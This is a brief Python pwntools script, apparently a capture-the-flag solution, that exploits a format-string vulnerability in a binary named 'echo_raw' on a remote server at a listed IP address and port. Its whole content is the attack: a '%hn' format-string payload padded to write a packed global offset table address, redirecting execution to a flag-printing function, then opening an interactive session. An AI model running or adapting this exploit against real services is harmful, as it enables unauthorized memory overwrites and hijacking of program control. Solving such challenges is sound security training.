from pwn import *

cat_flag = 0x4007B6
puts_got = 0x400616
#r = process('./echo_raw')
r = remote('125.235.240.168', 27015)
raw_input('?')
payload = "%1974c%11$hn%99999999c"
payload += "\x00"*(24-len(payload))
payload += p64(0x601018)
sleep(9)
r.sendline(payload)
r.interactive()